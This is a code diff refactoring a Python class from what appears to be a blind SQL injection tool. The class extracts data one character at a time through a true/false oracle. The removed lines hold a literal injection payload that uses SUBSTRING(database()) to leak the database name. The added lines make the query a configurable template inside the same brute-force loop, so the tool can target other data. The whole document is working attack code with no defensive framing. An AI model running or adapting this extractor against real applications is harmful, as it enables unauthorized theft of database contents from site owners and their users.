@@ -1,24 +1,29 @@
 class Extractor:
-    def __init__(self, inference, config):
-        self.inf = inference
+    def __init__(self, inference_engine, logger, config):
+        self.inf = inference_engine
+        self.logger = logger
+
         self.charset = config["extraction"]["charset"]
-        self.max_len = config["extraction"]["max_length"]
+        self.max_length = config["extraction"]["max_length"]
+        self.query_template = config["extraction"]["query"]
 
-    def extract_string(self):
-        result = ""
+    def extract(self):
+        extracted = ""
+        print("\nStarting extraction...\n")
 
-        for pos in range(1, self.max_len+1):
-            char = self.extract_char(pos)
-            if not char:
+        for position in range(1, self.max_length + 1):
+            found = False
+
+            for c in self.charset:
+                payload = self.query_template.format(pos=position, char=c)
+
+                if self.inf.is_true(payload):
+                    extracted += c
+                    print("[+] Found:", extracted)
+                    found = True
+                    break
+
+            if not found:
                 break
-            result += char
-            print(f"[+] Found: {result}")
 
-        return result
-
-    def extract_char(self, position):
-        for c in self.charset:
-            payload = f"1' AND SUBSTRING(database(),{position},1)='{c}' #"
-            if self.inf.is_true(payload):
-                return c
-        return None
+        return extracted
